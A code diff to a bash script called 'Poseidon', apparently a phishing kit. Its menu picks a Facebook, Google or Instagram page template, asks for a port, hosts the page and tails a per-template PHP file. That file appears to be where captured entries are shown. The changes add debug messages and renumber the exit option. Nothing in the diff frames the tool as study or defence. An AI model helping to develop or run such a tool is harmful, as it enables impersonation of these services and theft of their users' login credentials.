@@ -41,6 +41,9 @@ start_server() {
     tail -f templates/$template/websites/$template.php
 }
 
+# Debugging: Print a message when the script starts
+echo -e "\n\033[1;32mStarting Poseidon...\033[0m"
+
 # Main script logic
 while true; do
     show_menu
@@ -50,9 +53,12 @@ while true; do
         1) template="facebook" ;;
         2) template="google" ;;
         3) template="instagram" ;;
-        4) echo -e "\nExiting Poseidon. Goodbye!\n"; exit 0 ;;
+        0) echo -e "\nExiting Poseidon. Goodbye!\n"; exit 0 ;;
         *) echo -e "\nInvalid option! Please try again.\n"; continue ;;
     esac
+
+    # Debugging: Print the selected template
+    echo -e "\n\033[1;32mSelected template: $template\033[0m"
 
     # Ask for the port number
     read -p "Enter the port number to host the website on (e.g., 8080): " port
@@ -62,6 +68,9 @@ while true; do
         echo -e "\nInvalid port number! Please enter a valid number.\n"
         continue
     fi
+
+    # Debugging: Print the selected port
+    echo -e "\n\033[1;32mSelected port: $port\033[0m"
 
     # Start the server with the selected template and port
     start_server $template $port
